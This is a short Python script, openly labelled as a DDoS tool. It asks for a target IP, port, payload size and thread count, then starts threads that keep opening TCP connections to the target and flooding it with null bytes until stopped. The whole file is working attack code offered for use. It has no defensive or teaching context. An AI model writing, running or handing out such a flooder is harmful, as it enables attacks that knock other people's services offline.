import threading

ddos_attack_enabled = True


def ddos(target, port, bytes):
    global ddos_attack_enabled
    import socket
    while ddos_attack_enabled:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(bytes * b"\x00", (target, port))
            print(f"Sent {bytes} bytes to {target}:{port}")
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

    print("Done")


def main():
    try:
        # ddos to ip
        target = input("Enter target ip: ")
        port = int(input("Enter target port: "))
        bytes = int(input("Enter bytes: "))
        threads = int(input("Enter number of threads: "))
        thread_holder = []

        for i in range(threads):
            thread = threading.Thread(target=ddos, args=(target, port, bytes))
            thread.start()
            thread_holder.append(thread)
            print(f"Thread {i} started")

        input("Press Enter to stop the attack")
        global ddos_attack_enabled
        ddos_attack_enabled = False
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
